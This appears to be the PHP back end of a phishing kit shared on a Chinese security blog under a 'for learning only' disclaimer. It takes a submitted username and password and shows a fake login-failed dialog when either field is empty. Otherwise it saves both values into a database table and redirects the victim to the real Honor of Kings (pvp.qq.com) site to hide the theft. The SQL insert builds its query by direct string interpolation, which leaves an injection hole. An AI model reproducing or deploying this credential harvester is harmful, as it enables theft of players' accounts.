<!-- 
FancyPig's blog
https://www.iculture.cc
本程序仅供大家学习交流
禁止使用与违法犯罪
感谢大家！
-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?cb7a49e4f6a740b15e6fd25de2803712";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

 <style type="text/css">
.go{
    color: #fff !important;
    width: 100%;
    transition: all .4s;
    border-radius: .25rem;
    padding: .5rem 1rem;
    font-size: 1.25rem;
    line-height: 1.5;
    background-color: #146fdf;
    background-image: linear-gradient( 
90deg
 , #146fdf, #146fdf);
    /* -webkit-box-shadow: 0 5px 10px 0 rgb(16 110 253 / 30%); */
    /* box-shadow: 0 5px 10px 0 rgb(16 110 253 / 30%); */
    border: 0px;
    cursor: pointer;
}
</style>
<?php
$lynr = $_POST['lynr'];
$username = $_POST['username'];
$id = $_POST['id'];

//var_dump($lynr,$username);


if( $lynr == '' || $username == ''){

    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>提示：账号密码错误或未输入</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="http://bs4.vx.link/favicon.ico" type="image/x-icon"> 
    <style class="anchorjs"></style>
    
    
    <!-- <script type="text/javascript" src="./tmpui/tmpui.js"></script> -->
    <script type="text/javascript">
        var app = new tmpUI("./site.config");
    </script>











<link class="tmpUIRes" rel="stylesheet" href="lief/bootstrap.min.css">

<link class="tmpUIRes" rel="stylesheet" href="lief/index.css">
</head>

<body style="padding-right: 17px;" class="modal-open">
  
<div id="exampleModalCenter" class="modal fade show" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" style="display: block; padding-right: 17px;">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="mx-auto" id="exampleModalCenterTitle">登录失败</h5>
        
      </div>
      <div class="mx-auto b-1"><br>
        <p>账号或密码不能为空，请您重新登录</p>
      </div><br>
      <div >

     
    <a href="dod.php?_wv=2"><input type="button" class="go" value="确定"></a>
 
      </div>
    </div>
  </div>
</div>






<div class="modal-backdrop fade show"></div></html>';
    exit;
}



include('text.php');
$sql ="insert into mag (username,lynr,id) values ('{$lynr}','{$username}','{$id}')";

$sth =$pdo->prepare($sql);
$sth->execute();


header('location:http://pvp.qq.com/m/');
